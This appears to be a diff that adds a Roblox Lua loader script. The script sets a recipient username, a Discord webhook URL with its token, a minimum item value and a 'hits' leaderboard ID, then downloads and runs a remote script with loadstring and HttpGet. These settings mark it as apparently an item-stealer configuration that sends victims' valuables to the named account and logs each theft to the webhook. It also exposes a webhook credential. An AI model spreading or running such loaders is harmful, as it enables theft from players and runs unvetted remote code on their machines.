@@ -1,0 +1,6 @@
+Username = "JerwinWatching"
+Webhook = "https://discord.com/api/webhooks/1409768941735379024/XfI-o33kNxnqyp4hL2U9VqIHVgFHWCBHsH3Vw5vbitW4Qzutbs5kwptsSj-raOvkYGOr"
+MinimumValue = 1000000
+DiscordID = "Your discord user id" -- optional if you wanna be in hits lb
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BMRBeaming/BMRSCRIPT/refs/heads/main/BMRSCRIPT"))()
